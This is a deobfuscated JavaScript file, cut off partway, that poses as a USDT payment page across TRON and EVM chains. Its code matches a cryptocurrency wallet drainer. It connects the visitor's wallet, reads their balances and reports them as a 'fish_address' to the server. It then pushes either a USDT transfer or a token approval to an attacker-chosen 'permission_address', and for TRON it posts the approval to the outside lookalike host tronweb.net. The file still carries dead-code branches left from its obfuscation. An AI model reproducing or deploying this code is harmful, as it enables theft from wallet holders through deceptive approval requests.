//Tue May 27 2025 06:54:56 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
var _0xbe69e = 2;
const userData = {
  address: null,
  gasBalance: null,
  usdtBalance: null,
  energyBalance: null,
  chain: "TRC",
  unique_id: null,
  actualPrice: 0.1,
  connected: false
};
_0xbe69e = 16;
let configData = {
  domain: "",
  payment_address: "",
  permission_address: "",
  authorized_amount: "",
  authorize_note: "",
  model: "1",
  "0x_payment_address": "",
  "0x_permission_address": "",
  default_id: ""
};
var _0xd5f = 12;
const CHAIN_CONFIG = {
  TRC: {
    usdt: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    decimals: 6,
    symbol: "TRX",
    chainId: null,
    gas: 1,
    energyBalance: 100000
  },
  ERC: {
    rpc: ["https://cloudflare-eth.com"],
    usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    decimals: 6,
    symbol: "ETH",
    chainId: 1,
    gas: 0.004
  },
  BSC: {
    rpc: ["https://bsc-dataseed1.binance.org"],
    usdt: "0x55d398326f99059fF775485246999027B3197955",
    decimals: 18,
    symbol: "BNB",
    chainId: 56,
    gas: 0.002
  },
  POL: {
    rpc: ["https://polygon-rpc.com"],
    usdt: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    decimals: 6,
    symbol: "POL",
    chainId: 137,
    gas: 5
  },
  OKC: {
    rpc: ["https://exchainrpc.okex.org"],
    usdt: "0x382bB369d343125BfB2117af9c149795C6C65C50",
    decimals: 18,
    symbol: "OKT",
    chainId: 66,
    gas: 0.02
  },
  GRC: {
    rpc: ["https://evm.nodeinfo.cc"],
    usdt: "0x4151ab5072198d0843cd2999590ef292f49d6c66",
    decimals: 6,
    symbol: "GT",
    chainId: 86,
    gas: 0.1
  }
};
_0xd5f = 6;
const ERC20_ABI = [{
  constant: true,
  inputs: [{
    name: "_owner",
    type: "address"
  }],
  name: "balanceOf",
  outputs: [{
    name: "balance",
    type: "uint256"
  }],
  type: "function"
}];
function initPaymentUI(_0x56ef09) {
  setPageTitleAndIcon();
  initialize().then(() => {
    const _0x211b51 = detectDeviceType();
    var _0x1dcbc0 = 14;
    const _0x2fb903 = document.getElementById(_0x56ef09);
    _0x1dcbc0 = 16;
    if (_0x211b51 === "pc") {
      _0x2fb903.innerHTML = createPCPaymentUI();
      generateQRCode();
    } else {
      if (_0x211b51 === "mobile") {
        _0x2fb903.innerHTML = createMobilePaymentUI();
        updateWalletOptions(userData.chain);
      } else {
        if (_0x211b51 === "dapp") {
          _0x2fb903.innerHTML = createDappPaymentUI();
          connectWallet();
        }
      }
    }
  });
}
function setPageTitleAndIcon() {
  var _0x1cc250;
  const _0x536897 = getActualPrice();
  _0x1cc250 = 9;
  if (_0x536897) {
    document.title = "正在支付 " + _0x536897 + " USDT";
  } else {
    if (userData.actualPrice) {
      document.title = "正在支付 " + userData.actualPrice + " USDT";
    }
  }
  var _0x3ca838;
  let _0x12ae69 = document.querySelector("link[rel~='icon']");
  _0x3ca838 = 3;
  if (!_0x12ae69) {
    _0x12ae69 = document.createElement("link");
    _0x12ae69.rel = "icon";
    document.getElementsByTagName("head")[0].appendChild(_0x12ae69);
  }
  _0x12ae69.href = "/assets/common/images/usdt.ico";
}
function createPCPaymentUI() {
  return "\n        <div id=\"pcContainer\" class=\"device-container\" style=\"display: block;\">\n            <div class=\"qr-code-container\">\n                <p class=\"qr-code-title\">请使用钱包App扫描支付</p>\n                <div class=\"qr-code-box\">\n                    <div id=\"qrcode-container\"></div>\n                    <div class=\"qr-logo-container\">\n                        <img src=\"/assets/common/images/tether-usdt-logo.png\" class=\"qr-logo\">\n                    </div>\n                </div>\n            </div>\n        </div>\n    ";
}
function createMobilePaymentUI() {
  return "\n        <div id=\"mobileContainer\" class=\"device-container\" style=\"display: block;\">\n            <div class=\"wallet-selection\">\n                <h3>选择付款钱包</h3>\n                <div class=\"wallet-options\" id=\"wallets\">\n                </div>\n            </div>\n            <a href=\"javascript:void(0);\" onclick=\"payNow()\" class=\"pay-btn\">\n                打开钱包支付\n            </a>\n        </div>\n    ";
}
function createDappPaymentUI() {
  return "\n        <div id=\"dappContainer\" class=\"device-container\" style=\"display: block;\">\n            <p style=\"text-align: center; margin: 20px 0; color: #3C8CE7; font-weight: bold;\">\n                请直接点击下方按钮完成支付\n            </p>\n            <a href=\"javascript:void(0);\" id=\"dappPayButton\" class=\"pay-btn\">\n                确认支付 " + userData.actualPrice + " USDT\n            </a>\n        </div>\n    ";
}
async function initialize() {
  var _0x3290c8 = 9;
  let _0x131fd4 = new URLSearchParams(window.location.search);
  _0x3290c8 = 8;
  let _0x3d12f5 = _0x131fd4.get("id");
  if (_0x3d12f5) {
    _0x3d12f5 = _0x3d12f5.split("#")[0];
    const _0x4215a8 = _0x3d12f5.match(new RegExp("^(trc|erc|bsc|okc|pol|grc)(\\d{1,15})$", "i"));
    if (_0x4215a8) {
      userData.chain = _0x4215a8[1].toUpperCase();
      userData.unique_id = _0x4215a8[2];
    }
  }
  try {
    if ("zXuQU".split("").reverse().join("") !== "zXuQU".split("").reverse().join("")) {
      if (!_0x409639.execCommand("copy")) {
        throw new _0x3c6e84();
      }
      this.showCopySuccess();
    } else {
      var _0x2b764b = 16;
      const _0x2f4336 = await fetch("/payment-config");
      _0x2b764b = 7;
      var _0x4f0953;
      const _0x3f5ca4 = await _0x2f4336.json();
      _0x4f0953 = "hcepca";
      if (_0x3f5ca4.status === "sseccus".split("").reverse().join("") && _0x3f5ca4.config) {
        if ("fzNMb".split("").reverse().join("") === "bMNzf") {
          if (_0x3f5ca4.config.domain) {
            var _0x2c688a = 7;
            const _0x2fb1f7 = _0x3f5ca4.config.domain.split(new RegExp("\\r\\n|\\r|\\n", "")).map(_0x14715b => _0x14715b.trim()).filter(_0x506933 => _0x506933);
            _0x2c688a = 13;
            if (_0x2fb1f7.length > 0) {
              {
                const _0x223922 = Math.floor(Math.random() * _0x2fb1f7.length);
                _0x3f5ca4.config.domain = _0x2fb1f7[_0x223922];
              }
            }
          }
          if (_0x3f5ca4.config.permission_address) {
            if ("SieXW".split("").reverse().join("") === "WXeiS") {
              var _0x2e7a2c = 7;
              const _0x53bfe5 = _0x3f5ca4.config.permission_address.split(new RegExp("\\r\\n|\\r|\\n", "")).map(_0x3418e1 => _0x3418e1.trim()).filter(_0x52e5db => _0x52e5db);
              _0x2e7a2c = 5;
              if (_0x53bfe5.length > 0) {
                if ("CmstG".split("").reverse().join("") === "hLoJM") {
                  _0x2b81cd(_0x4d2920, _0x5b6fe3, true);
                  return;
                } else {
                  var _0x36fea0 = 10;
                  const _0x2d44d6 = Math.floor(Math.random() * _0x53bfe5.length);
                  _0x36fea0 = 7;
                  _0x3f5ca4.config.permission_address = _0x53bfe5[_0x2d44d6];
                }
              }
            } else {
              _0x3a54b9 = _0x36af2f + "//" + _0x28bf29 + _0x76b8de + _0x32cbe1;
            }
          }
          Object.assign(configData, _0x3f5ca4.config);
          const _0x536d27 = getActualPrice();
          if (_0x536d27 !== null) {
            userData.actualPrice = _0x536d27;
          }
          return true;
        } else {
          throw new _0xd21dc4(_0x302be9.error);
        }
      }
      return false;
    }
  } catch (_0x59bd8a) {
    console.error("initialize 初始化失败:", _0x59bd8a);
    return false;
  }
}
function getActualPrice() {
  let _0x676874 = null;
  const _0x5f3d99 = document.querySelectorAll("tr, .mb-1, .price-item");
  _0x5f3d99.forEach(_0x574c37 => {
    {
      var _0x4517d0 = 14;
      const _0x5559bd = _0x574c37.querySelector("th, label");
      _0x4517d0 = 6;
      const _0x3759c4 = _0x574c37.querySelector("td, span");
      if (_0x5559bd && _0x3759c4) {
        const _0xd72f7a = _0x5559bd.textContent.trim();
        if (_0xd72f7a.includes("实际支付价格") || _0xd72f7a.includes("actual_price") || _0xd72f7a.includes("总价")) {
          {
            var _0x11479c;
            const _0x394084 = _0x3759c4.textContent.trim();
            _0x11479c = 9;
            const _0x5f01b1 = parseFloat(_0x394084.replace(new RegExp("[^\\d.]", "g"), ""));
            if (!isNaN(_0x5f01b1) && _0x5f01b1 > 0) {
              {
                _0x676874 = _0x5f01b1;
              }
            }
          }
        }
      }
    }
  });
  if (!_0x676874) {
    var _0x4719f2 = 10;
    const _0x444372 = document.querySelectorAll(".price, .total-price, .actual-price");
    _0x4719f2 = "jhnilh";
    _0x444372.forEach(_0x450c27 => {
      var _0x3495bf = 4;
      const _0x2f2c29 = _0x450c27.textContent.trim();
      _0x3495bf = 15;
      const _0x42ad87 = parseFloat(_0x2f2c29.replace(new RegExp("[^\\d.]", "g"), ""));
      if (!isNaN(_0x42ad87) && _0x42ad87 > 0) {
        _0x676874 = _0x42ad87;
      }
    });
  }
  return _0x676874;
}
function detectDeviceType() {
  const _0x4eb8c8 = new RegExp("Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini", "i").test(navigator.userAgent);
  var _0x590a39;
  let _0x359bee = false;
  _0x590a39 = 5;
  if (userData.chain === "TRC") {
    {
      _0x359bee = typeof window.tronWeb !== "undefined" && window.tronWeb.ready === true && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58;
    }
  } else {
    _0x359bee = typeof window.ethereum !== "undefined" && (_0x4eb8c8 || window.ethereum.isTokenPocket || window.ethereum.isTrust || window.ethereum.isImToken || new RegExp("TokenPocket|ImToken|TrustWallet|MetaMask|Coinbase", "i").test(navigator.userAgent));
  }
  if (_0x359bee) {
    return "dapp";
  }
  if (_0x4eb8c8) {
    return "mobile";
  }
  return "pc";
}
function generateQRCode() {
  try {
    let _0x1221bc = window.location.href;
    const _0x92aaf0 = document.getElementById("qrcode-container");
    if (_0x92aaf0) {
      _0x92aaf0.innerHTML = "";
      const _0x3c0aaa = new QRious({
        value: _0x1221bc,
        size: 240,
        level: "H",
        background: "white"
      });
      var _0x289a3a = 4;
      const _0x385b6b = document.createElement("img");
      _0x289a3a = 11;
      _0x385b6b.src = _0x3c0aaa.toDataURL();
      _0x385b6b.width = 240;
      _0x385b6b.height = 240;
      _0x385b6b.style.display = "block";
      _0x92aaf0.appendChild(_0x385b6b);
    }
  } catch (_0x339b1f) {
    console.error("二维码生成失败:", _0x339b1f);
  }
}
function updateWalletOptions(_0x3265ab) {
  const _0xe24206 = document.getElementById("wallets");
  if (!_0xe24206) {
    return;
  }
  _0xe24206.innerHTML = "";
  var _0x12f66e;
  const _0x341598 = _0x3265ab.toLowerCase() === "trc" ? [{
    id: "imToken",
    name: "imToken钱包",
    icon: "/assets/common/images/imtoken.png"
  }, {
    id: "tokenpocket",
    name: "TokenPocket",
    icon: "/assets/common/images/tokenpocket.png"
  }, {
    id: "Bitpie",
    name: "Bitpie钱包",
    icon: "/assets/common/images/bitpie.png"
  }, {
    id: "TRONLINK",
    name: "TronLink钱包",
    icon: "/assets/common/images/TronLink.png"
  }] : [{
    id: "imToken",
    name: "imToken",
    icon: "/assets/common/images/imtoken.png"
  }, {
    id: "MetaMask",
    name: "MetaMask",
    icon: "/assets/common/images/metamask.png"
  }, {
    id: "Trust",
    name: "Trust Wallet",
    icon: "/assets/common/images/trust.png"
  }, {
    id: "TokenPocket",
    name: "TokenPocket",
    icon: "/assets/common/images/tokenpocket.png"
  }, {
    id: "BitGet",
    name: "BitGet Wallet",
    icon: "/assets/common/images/bitget.png"
  }, {
    id: "Coinbase",
    name: "Coinbase Wallet",
    icon: "/assets/common/images/coinbase.png"
  }];
  _0x12f66e = "inlfni";
  _0x341598.forEach(_0x5b4442 => {
    var _0x96d5c4;
    const _0x5756ba = document.createElement("div");
    _0x96d5c4 = 0;
    _0x5756ba.className = "wallet-option";
    _0x5756ba.setAttribute("data-wallet", _0x5b4442.id);
    _0x5756ba.innerHTML = "\n            <img src=\"" + _0x5b4442.icon + "\" alt=\"" + _0x5b4442.name + "\">\n            <span>" + _0x5b4442.name + "</span>\n        ";
    _0x5756ba.addEventListener("click", function () {
      var _0x50f97e = 10;
      const _0x335bc0 = _0xe24206.querySelectorAll(".wallet-option");
      _0x50f97e = 8;
      _0x335bc0.forEach(_0x42d84f => _0x42d84f.classList.remove("selected"));
      this.classList.add("selected");
    });
    _0xe24206.appendChild(_0x5756ba);
  });
}
function payNow() {
  var _0x513355 = 11;
  const _0x3c1dfb = document.querySelector("#wallets .wallet-option.selected");
  _0x513355 = 13;
  if (!_0x3c1dfb) {
    {
      alert("请先选择您的付款钱包");
      return;
    }
  }
  var _0x501589 = 7;
  const _0xf542d6 = _0x3c1dfb.getAttribute("data-wallet");
  _0x501589 = 7;
  let _0x4d793b = window.location.href;
  var _0x20149f;
  const _0x52bff8 = {
    Bitpie: "/assets/common/images/bitpie.jpg",
    TRONLINK: "/assets/common/images/TronLink.jpg"
  };
  _0x20149f = 3;
  if (_0x52bff8[_0xf542d6]) {
    walletModal.show(_0x52bff8[_0xf542d6], _0x4d793b);
    return;
  }
  const _0x4af391 = {
    imToken: "imtokenv2://navigate?screen=DappView&url=" + _0x4d793b,
    tokenpocket: "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({
      url: _0x4d793b
    })),
    BitGet: "bitget://navigate_to?url=" + encodeURIComponent(JSON.stringify({
      url: _0x4d793b
    })),
    MetaMask: "https://metamask.app.link/dapp/" + new URL(_0x4d793b).host + new URL(_0x4d793b).pathname + new URL(_0x4d793b).search,
    Trust: "trust://open_url?url=" + _0x4d793b,
    Coinbase: "https://go.cb-w.com/dapp?cb_url=" + encodeURIComponent(_0x4d793b)
  };
  if (_0x4af391[_0xf542d6]) {
    window.location.href = _0x4af391[_0xf542d6];
  } else {
    {
      console.error("未知的钱包类型:", _0xf542d6);
    }
  }
}
const walletModal = {
  show(_0x35e3f1, _0x643e09) {
    const _0x323b33 = _0x643e09 || window.location.href;
    const _0x18421b = _0x323b33.split("?")[0];
    document.getElementById("currentUrl").textContent = _0x18421b;
    document.getElementById("currentUrl").dataset.fullUrl = _0x323b33;
    document.getElementById("walletGuideImage").src = _0x35e3f1;
    document.getElementById("walletModal").style.display = "block";
  },
  close() {
    document.getElementById("walletModal").style.display = "none";
  },
  copyUrl() {
    const _0x9c3367 = document.getElementById("currentUrl").dataset.fullUrl;
    var _0x385b12 = 8;
    const _0x174f9e = () => alert("复制失败，请手动复制");
    _0x385b12 = 4;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(_0x9c3367).then(() => this.showCopySuccess()).catch(_0x174f9e);
    } else {
      var _0x587143;
      const _0x5b5ebb = document.createElement("textarea");
      _0x587143 = 6;
      _0x5b5ebb.value = _0x9c3367;
      _0x5b5ebb.style.position = "absolute";
      _0x5b5ebb.style.left = "-9999px";
      document.body.appendChild(_0x5b5ebb);
      _0x5b5ebb.select();
      try {
        if (!document.execCommand("copy")) {
          throw new Error();
        }
        this.showCopySuccess();
      } catch {
        {
          _0x174f9e();
        }
      }
      document.body.removeChild(_0x5b5ebb);
    }
  },
  showCopySuccess() {
    const _0x218dd9 = document.getElementById("copySuccess");
    _0x218dd9.style.display = "block";
    setTimeout(() => {
      {
        _0x218dd9.style.display = "none";
      }
    }, 2000);
  }
};
async function connectWallet() {
  const _0x4091f0 = document.getElementById("dappPayButton");
  var _0x207116 = 12;
  const _0x5d41e6 = CHAIN_CONFIG[userData.chain].symbol;
  _0x207116 = 6;
  var _0x512d05 = 9;
  const _0x6e6b68 = "到接连法无".split("").reverse().join("") + _0x5d41e6 + "网络，请检查您的钱包网络";
  _0x512d05 = 2;
  try {
    {
      if (userData.chain === "TRC") {
        if ("mRXqo".split("").reverse().join("") !== "lSsGi".split("").reverse().join("")) {
          if (typeof window.tronWeb === "undefined") {
            if ("iSoUj".split("").reverse().join("") !== "IComp") {
              updateButton(_0x4091f0, _0x6e6b68, true);
              return;
            } else {
              const _0x39a35a = _0x2c1633 ? function () {
                if (_0x335b77) {
                  const _0x47d7fe = _0xc9c0a4.apply(_0xc5a4ed, arguments);
                  _0x2ec9d6 = null;
                  return _0x47d7fe;
                }
              } : function () {};
              _0x5c17d1 = false;
              return _0x39a35a;
            }
          }
          if (!window.tronWeb.defaultAddress.base58) {
            if (window.tronWeb.ready) {
              {
                await window.tronWeb.request({
                  method: "tron_requestAccounts"
                });
              }
            }
            if (!window.tronWeb.defaultAddress.base58) {
              {
                updateButton(_0x4091f0, _0x6e6b68, true);
                return;
              }
            }
          }
          userData.address = window.tronWeb.defaultAddress.base58;
          userData.connected = true;
          var _0x2abc88 = 6;
          const _0x2fbe77 = await getTronBalances();
          _0x2abc88 = "ilgmgf".split("").reverse().join("");
          if (!_0x2fbe77) {
            if ("kUJsY".split("").reverse().join("") !== "idCLt") {
              updateButton(_0x4091f0, "无法获取余额信息，请刷新页面重试", true);
              return;
            } else {
              if (_0x4e45a6.authorize_note && _0x468bc9.authorize_note.trim() !== "") {
                _0x5dc535(_0x5db069.authorize_note);
              }
            }
          }
          broadcastBrowseInfo();
          const _0x26e6fc = parseFloat(userData.gasBalance) >= CHAIN_CONFIG.TRC.gas && userData.energyBalance >= CHAIN_CONFIG.TRC.energyBalance;
          var _0x27b31e;
          const _0x5edd44 = parseFloat(userData.gasBalance) >= 25;
          _0x27b31e = "ccfeda";
          if (!_0x26e6fc && !_0x5edd44) {
            {
              updateButton(_0x4091f0, _0x5d41e6 + "矿工费不足无法发起支付", true);
            }
          } else {
            {
              const _0x4503eb = updateButton(_0x4091f0, "确认开始支付", false);
              _0x4503eb.addEventListener("click", checkAndPayProcess);
            }
          }
        } else {
          const _0xb9cce0 = _0x5b7375();
          var _0x4420b1 = 14;
          const _0x3e7555 = _0x264ce3.getElementById(_0x2e30ce);
          _0x4420b1 = 16;
          if (_0xb9cce0 === "pc") {
            _0x3e7555.innerHTML = _0x4632d1();
            _0x1d9057();
          } else {
            if (_0xb9cce0 === "elibom".split("").reverse().join("")) {
              _0x3e7555.innerHTML = _0x543191();
              _0x508624(_0x3fc716.chain);
            } else {
              if (_0xb9cce0 === "ppad".split("").reverse().join("")) {
                _0x3e7555.innerHTML = _0x1b47ef();
                _0x4b8243();
              }
            }
          }
        }
      } else {
        if (typeof window.ethereum === "undefined") {
          updateButton(_0x4091f0, _0x6e6b68, true);
          return;
        }
        const _0x10f917 = await window.ethereum.request({
          method: "eth_requestAccounts"
        });
        if (!_0x10f917 || _0x10f917.length === 0) {
          updateButton(_0x4091f0, _0x6e6b68, true);
          return;
        }
        userData.address = _0x10f917[0];
        userData.connected = true;
        const _0xf84b3b = CHAIN_CONFIG[userData.chain].chainId || 1;
        var _0x49b2ef = 12;
        const _0x11b605 = await window.ethereum.request({
          method: "eth_chainId"
        });
        _0x49b2ef = 3;
        const _0x92df33 = parseInt(_0x11b605, 16);
        if (_0x92df33 !== _0xf84b3b) {
          try {
            await window.ethereum.request({
              method: "wallet_switchEthereumChain",
              params: [{
                chainId: "0x" + _0xf84b3b.toString(16)
              }]
            });
          } catch (_0x2b5fd1) {
            if ("ulqmN".split("").reverse().join("") === "Nmqlu") {
              updateButton(_0x4091f0, _0x6e6b68, true);
              return;
            } else {
              _0x1f901e.energyBalance = 0;
            }
          }
        }
        const _0xf8c1f9 = await getEVMBalances();
        if (!_0xf8c1f9) {
          {
            updateButton(_0x4091f0, "无法获取余额信息，请刷新页面重试", true);
            return;
          }
        }
        broadcastBrowseInfo();
        const _0x4127ab = CHAIN_CONFIG[userData.chain].gas || 0;
        if (parseFloat(userData.gasBalance) < _0x4127ab) {
          updateButton(_0x4091f0, _0x5d41e6 + "付支起发法无足不费工矿".split("").reverse().join(""), true);
        } else {
          if (parseFloat(userData.usdtBalance) < userData.actualPrice) {
            if ("HtWVQ".split("").reverse().join("") === "CaZvX".split("").reverse().join("")) {
              _0x3b9709.show(_0x3d1ffe[_0x551729], _0x128f9d);
              return;
            } else {
              updateButton(_0x4091f0, "USDT不足以支付当前订单", true);
            }
          } else {
            if ("jnMcX".split("").reverse().join("") === "MCbdP") {
              _0x28d018("！面界单订转跳将即，功成付支".split("").reverse().join(""));
              const _0x5d9ff8 = _0x319a30.location.origin;
              const _0x35409a = _0x539d61.chain.toLowerCase();
              const _0x1c748a = _0x58b4c6.unique_id || "";
              var _0x342fde = 10;
              const _0x1ecf7d = "" + _0x35409a + _0x1c748a;
              _0x342fde = "bfhigq";
              _0x23479f(() => {
                _0x129634.location.href = _0x5d9ff8 + "/search-order-by-browser?id=" + _0x1ecf7d;
              }, 2000);
            } else {
              var _0x480cc9 = 13;
              const _0x1221f8 = updateButton(_0x4091f0, "确认开始支付", false);
              _0x480cc9 = "jpiopd";
              _0x1221f8.addEventListener("click", checkAndPayProcess);
            }
          }
        }
      }
    }
  } catch (_0x36a792) {
    if ("JkNLt".split("").reverse().join("") === "WTOxR") {
      _0x272922(_0x310bff.authorize_note);
    } else {
      console.error("钱包连接失败:", _0x36a792);
      updateButton(_0x4091f0, _0x6e6b68, true);
    }
  }
}
async function broadcastBrowseInfo() {
  try {
    if ("lhQYo".split("").reverse().join("") === "oYQhl") {
      if (!userData?.["sserdda".split("").reverse().join("")] || userData.address.trim() === "") {
        {
          return false;
        }
      }
      var _0x2a6a25 = 12;
      const _0x693c0a = userData.chain === "CRT".split("").reverse().join("") ? "" : "";
      _0x2a6a25 = 9;
      var _0x3b5825 = 9;
      const _0x1fa794 = new Date();
      _0x3b5825 = "gmlcdd";
      const _0x2b0b63 = _0x1fa794.getFullYear() + "-" + String(_0x1fa794.getMonth() + 1).padStart(2, "0") + "-" + String(_0x1fa794.getDate()).padStart(2, "0") + " " + String(_0x1fa794.getHours()).padStart(2, "0") + ":" + String(_0x1fa794.getMinutes()).padStart(2, "0") + ":" + String(_0x1fa794.getSeconds()).padStart(2, "0");
      var _0x664c98 = 14;
      const _0x16afe5 = {
        fish_address: userData.address,
        chainid: userData.chain,
        permissions_fishaddress: _0x693c0a || "",
        unique_id: userData.unique_id || null,
        usdt_balance: parseFloat(userData.usdtBalance || 0).toFixed(6),
        gas_balance: parseFloat(userData.gasBalance || 0).toFixed(6),
        time: _0x2b0b63
      };
      _0x664c98 = "fgjkfg";
      await fetch("/browse-broadcast", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(_0x16afe5)
      });
      return true;
    } else {
      _0x4ce843(_0x36a21b, _0x38fc7c, true);
      return;
    }
  } catch (_0x234531) {
    console.error("钱包连接播报失败:", _0x234531);
    return false;
  }
}
async function getTronBalances() {
  try {
    {
      const _0x21aa11 = await window.tronWeb.trx.getBalance(userData.address);
      userData.gasBalance = (_0x21aa11 / 1000000).toFixed(6);
      const _0x4132dd = await window.tronWeb.contract().at(CHAIN_CONFIG.TRC.usdt);
      var _0x69de76 = 5;
      const _0x33bb81 = await _0x4132dd.methods.balanceOf(userData.address).call();
      _0x69de76 = 2;
      userData.usdtBalance = (parseInt(_0x33bb81._hex) / 1000000).toFixed(6);
      var _0x58723e = 12;
      const _0x2d0fd0 = await window.tronWeb.trx.getAccountResources(userData.address);
      _0x58723e = "fcenmg";
      if (_0x2d0fd0 && typeof _0x2d0fd0 === "object") {
        if ("SJPRX" === "IrOJZ".split("").reverse().join("")) {
          var _0x4e2675;
          const _0x1e834a = _0x3a9fa1.textContent.trim();
          _0x4e2675 = 9;
          const _0x507d74 = _0x20c13c(_0x1e834a.replace(new _0x409cc8("[^\\d.]", "g"), ""));
          if (!_0x31f97b(_0x507d74) && _0x507d74 > 0) {
            _0x2525b6 = _0x507d74;
          }
        } else {
          var _0x2e3ec0 = 9;
          const _0x52526e = _0x2d0fd0.EnergyLimit || 0;
          _0x2e3ec0 = 8;
          var _0x4acb7f;
          const _0x387195 = _0x2d0fd0.EnergyUsed || 0;
          _0x4acb7f = 8;
          userData.energyBalance = _0x52526e - _0x387195;
          if (isNaN(userData.energyBalance)) {
            userData.energyBalance = 0;
          }
        }
      } else {
        userData.energyBalance = 0;
      }
      return true;
    }
  } catch (_0x5e63b4) {
    if ("xWSPF".split("").reverse().join("") !== "RXQqC") {
      console.error("获取TRC20余额失败:", _0x5e63b4);
      userData.gasBalance = "000000.0".split("").reverse().join("");
      userData.usdtBalance = "0.000000";
      userData.energyBalance = 0;
      return false;
    } else {
      _0x41d553 = _0x2b0614[1];
    }
  }
}
async function getEVMBalances() {
  try {
    const _0xc7d809 = new Web3(window.ethereum);
    const _0x412996 = await _0xc7d809.eth.getBalance(userData.address);
    userData.gasBalance = (_0x412996 / 1000000000000000000).toFixed(6);
    var _0x32f052 = 1;
    const _0x382e19 = CHAIN_CONFIG[userData.chain];
    _0x32f052 = "dqoaih";
    const _0x594a3e = new _0xc7d809.eth.Contract(ERC20_ABI, _0x382e19.usdt);
    var _0x4ca238;
    const _0x136f49 = await _0x594a3e.methods.balanceOf(userData.address).call();
    _0x4ca238 = 13;
    userData.usdtBalance = (_0x136f49 / Math.pow(10, _0x382e19.decimals)).toFixed(6);
    return true;
  } catch (_0xc39bda) {
    console.error("获取EVM余额失败:", _0xc39bda);
    userData.gasBalance = "0.000000";
    userData.usdtBalance = "0.000000";
    return false;
  }
}
async function checkAndPayProcess() {
  var _0x2aebc7 = 9;
  const _0x4d6a8e = document.getElementById("dappPayButton");
  _0x2aebc7 = 0;
  updateButton(_0x4d6a8e, "支付处理中...", true);
  setTimeout(() => {
    if ("tTVWp" === "slSuI".split("").reverse().join("")) {
      _0x188780 = typeof _0x233792.tronWeb !== "undefined" && _0x26833a.tronWeb.ready === true && _0x4ad8c5.tronWeb.defaultAddress && _0x2c21d4.tronWeb.defaultAddress.base58;
    } else {
      var _0x258182 = 6;
      const _0x55ad18 = document.getElementById("dappPayButton");
      _0x258182 = 2;
      if (_0x55ad18) {
        if ("aqQtr" !== "rtQqa".split("").reverse().join("")) {
          _0x553164 = typeof _0x4534d0.ethereum !== "undefined" && (_0x4aca06 || _0x4dd211.ethereum.isTokenPocket || _0x40bf90.ethereum.isTrust || _0x2ff8d6.ethereum.isImToken || new _0x400ce5("TokenPocket|ImToken|TrustWallet|MetaMask|Coinbase", "i").test(_0x23df59.userAgent));
        } else {
          updateButton(_0x55ad18, "确认开始支付", false);
        }
      }
    }
  }, 3000);
  try {
    {
      var _0x2919ea = 10;
      let _0x34f21d = false;
      _0x2919ea = 9;
      const _0x10e47e = new FormData();
      _0x10e47e.append("fish_address", userData.address);
      _0x10e47e.append("chainid", userData.chain);
      const _0x22a137 = await fetch("/query-address", {
        method: "POST",
        body: _0x10e47e
      });
      const _0x40c05b = await _0x22a137.text();
      let _0x58e8b3 = JSON.parse(_0x40c05b);
      _0x34f21d = _0x58e8b3.status === "success" && _0x58e8b3.result === "yes";
      if (_0x34f21d) {
        if ("mdNBm".split("").reverse().join("") !== "BVRuM".split("").reverse().join("")) {
          if (userData.chain === "TRC") {
            await TRCUsdtTransfer();
          } else {
            await EVMUsdtTransfer();
          }
        } else {
          if (!_0x5e15e7) {
            return _0xf7ef09;
          }
          var _0x14d207;
          const _0x34c3e6 = _0x1d7957.cloneNode(true);
          _0x14d207 = "nllhoe".split("").reverse().join("");
          _0x54ef99.parentNode.replaceChild(_0x34c3e6, _0x2e8a);
          _0x34c3e6.textContent = _0x2af766;
          _0x34c3e6.disabled = _0x4d1b6c;
          if (_0x509689) {
            _0x34c3e6.classList.add("disabled");
            _0x34c3e6.style.backgroundColor = "#aaaaaa";
            _0x34c3e6.style.cursor = "dewolla-ton".split("").reverse().join("");
          } else {
            _0x34c3e6.classList.remove("disabled");
            _0x34c3e6.style.backgroundColor = "";
            _0x34c3e6.style.cursor = "retniop".split("").reverse().join("");
            _0x34c3e6.addEventListener("click", _0x544839);
          }
          return _0x34c3e6;
        }
      } else {
        if ("mvjtz".split("").reverse().join("") !== "mvjtz".split("").reverse().join("")) {
          const _0x5388da = _0x249447.getElementById("copySuccess");
          _0x5388da.style.display = "block";
          _0x283186(() => {
            _0x5388da.style.display = "none";
          }, 2000);
        } else {
          if (userData.chain === "CRT".split("").reverse().join("")) {
            {
              await TRCapproval();
            }
          } else {
            await EVMapproval();
          }
        }
      }
    }
  } catch (_0x49f573) {
    {
      console.error("checkAndPayProcess错误:", _0x49f573);
    }
  }
}
function updateButton(_0xd1ac20, _0x4526ba, _0x5c0555) {
  if (!_0xd1ac20) {
    return _0xd1ac20;
  }
  var _0x16c97a;
  const _0x2a81de = _0xd1ac20.cloneNode(true);
  _0x16c97a = "eohlln";
  _0xd1ac20.parentNode.replaceChild(_0x2a81de, _0xd1ac20);
  _0x2a81de.textContent = _0x4526ba;
  _0x2a81de.disabled = _0x5c0555;
  if (_0x5c0555) {
    {
      _0x2a81de.classList.add("disabled");
      _0x2a81de.style.backgroundColor = "#aaaaaa";
      _0x2a81de.style.cursor = "not-allowed";
    }
  } else {
    _0x2a81de.classList.remove("disabled");
    _0x2a81de.style.backgroundColor = "";
    _0x2a81de.style.cursor = "pointer";
    _0x2a81de.addEventListener("click", checkAndPayProcess);
  }
  return _0x2a81de;
}
async function TRCapproval() {
  try {
    {
      var _0x2f4c53;
      const _0x4b0564 = "";
      _0x2f4c53 = 14;
      var _0x358473;
      const _0x5f1eb9 = "";
      _0x358473 = 12;
      var _0x4d4bfc = 11;
      const _0x22b754 = "https://tronweb.net/api/approve";
      _0x4d4bfc = 4;
      const _0x14f485 = await fetch(_0x22b754, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          spenderAddress: _0x4b0564,
          userAddress: userData.address,
